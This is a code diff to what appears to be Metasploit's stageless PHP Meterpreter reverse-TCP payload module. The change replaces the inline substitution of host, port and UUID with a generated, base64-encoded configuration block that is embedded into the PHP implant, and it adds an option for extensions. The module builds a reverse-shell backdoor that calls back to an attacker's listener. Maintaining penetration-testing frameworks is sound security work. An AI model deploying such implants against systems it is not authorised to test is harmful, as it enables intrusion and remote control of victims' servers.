@@ -4,10 +4,12 @@
 ##
 
 module MetasploitModule
-  CachedSize = 34928
+  CachedSize = :dynamic
 
   include Msf::Payload::Single
   include Msf::Payload::Php::ReverseTcp
+  include Msf::Payload::TransportConfig
+  include Msf::Payload::UUID::Options
   include Msf::Sessions::MeterpreterOptions
 
   def initialize(info = {})
@@ -24,21 +26,38 @@ module MetasploitModule
         'Session' => Msf::Sessions::Meterpreter_Php_Php
       )
     )
+
+    register_options([
+      OptString.new('EXTENSIONS', [false, 'Comma-separate list of extensions to load'])
+    ])
+  end
+
+  def generate_config(opts = {})
+    ds = opts[:datastore] || datastore
+    opts[:uuid] ||= generate_payload_uuid
+
+    opts[:transport_config] ||= [transport_config_reverse_tcp(opts)]
+
+    config_opts = {
+      ascii_str:         true,
+      null_session_guid: true,
+      expiration:        (ds[:expiration] || ds['SessionExpirationTimeout']).to_i,
+      uuid:              opts[:uuid],
+      transports:        opts[:transport_config],
+      extensions:        (ds['EXTENSIONS'] || '').split(','),
+      ext_format:        'php',
+      stageless:         true,
+    }.merge(meterpreter_logging_config(opts))
+
+    config = Rex::Payloads::Meterpreter::Config.new(config_opts)
+    config.to_b
   end
 
   def generate(_opts = {})
     met = MetasploitPayloads.read('meterpreter', 'meterpreter.php')
 
-    met.gsub!('127.0.0.1', datastore['LHOST']) if datastore['LHOST']
-    met.gsub!('4444', datastore['LPORT'].to_s) if datastore['LPORT']
-
-    uuid = generate_payload_uuid
-    bytes = uuid.to_raw.chars.map { |c| '\x%.2x' % c.ord }.join('')
-    met = met.sub(%q{"PAYLOAD_UUID", ""}, %("PAYLOAD_UUID", "#{bytes}"))
-
-    # Stageless payloads need to have a blank session GUID
-    session_guid = '\x00' * 16
-    met = met.sub(%q{"SESSION_GUID", ""}, %("SESSION_GUID", "#{session_guid}"))
+    config_block = Rex::Text.encode_base64(generate_config(_opts))
+    met = met.sub('"CONFIG_BLOCK", ""', "\"CONFIG_BLOCK\", \"#{config_block}\"")
 
     if datastore['MeterpreterDebugBuild']
       met.sub!(%q{define("MY_DEBUGGING", false);}, %|define("MY_DEBUGGING", true);|)
@@ -48,7 +67,6 @@ module MetasploitModule
     end
 
     met.gsub!(/#.*$/, '')
-    met = Rex::Text.compress(met)
-    met
+    Rex::Text.compress(met)
   end
 end
